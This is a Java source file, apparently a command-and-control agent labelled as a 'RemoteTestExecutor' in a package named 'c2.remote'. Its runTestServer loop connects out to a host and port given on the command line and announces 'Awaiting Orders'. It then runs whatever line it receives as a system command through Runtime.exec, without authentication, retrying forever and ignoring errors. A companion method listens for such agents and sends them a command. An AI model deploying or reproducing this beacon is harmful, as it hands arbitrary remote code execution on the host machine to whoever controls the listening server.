package c2.remote;

import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import util.Time;

public class RemoteTestExecutor {

	private ExecutorService service = Executors.newFixedThreadPool(4);

	public static void main(String args[]) {
		String host = args[0];
		int port = Integer.parseInt(args[1]);
		RemoteTestExecutor exec = new RemoteTestExecutor();
		exec.runTestServer(host, port);
	}

	public void startTestProgram(int port, String startCmd) {
		try {
			ServerSocket ss = new ServerSocket(port);
			ss.setSoTimeout(5000);

			Socket newSession = ss.accept();

			try {
				OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(newSession.getOutputStream()));
				BufferedReader br = new BufferedReader(new InputStreamReader(newSession.getInputStream()));

				Time.sleepWrapped(1000);

				if (br.ready()) {
					System.out.println("Reading");
					String input = br.readLine();
					System.out.println(input);

					bw.write(startCmd + System.lineSeparator());
					bw.flush();

					input = br.readLine();
					System.out.println(input);
				} else {
					System.out.println("This guy isn't talking to us");
					newSession.close();
				}

			} catch (IOException e) {
				e.printStackTrace();
				newSession.close();
			}

			ss.close();
		} catch (IOException ex) {
			ex.printStackTrace();
		}
	}

	public void runTestServer(String host, int port) {
		while (true) {
			try {
				System.out.println("Attempting contact");
				Socket remote = new Socket(host, port);
				System.out.println("Contact!!!");
				OutputStreamWriter bw = new OutputStreamWriter(new BufferedOutputStream(remote.getOutputStream()));
				BufferedReader br = new BufferedReader(new InputStreamReader(remote.getInputStream()));
				bw.write("Awaiting Orders" + System.lineSeparator());
				bw.flush();
				String input = br.readLine();
				System.out.println("Running command: " + input);
				Runnable runner2 = new Runnable() {
					@Override
					public void run() {
						try {
							Process process = Runtime.getRuntime().exec(input);
							process.waitFor();
						} catch (IOException | InterruptedException e) {

						}

					}
				};
				Future<?> exe = service.submit(runner2);
				bw.write("Process execute" + System.lineSeparator());
				bw.flush();
				exe.get();
				
				remote.close();
			} catch (IOException | InterruptedException ex) {
				//Ignore and proceed, attempt new contact
				//ex.printStackTrace();
			} catch (ExecutionException e) {
				e.printStackTrace();
			} finally {
				Time.sleepWrapped(1000);
			}
		}
	}
}
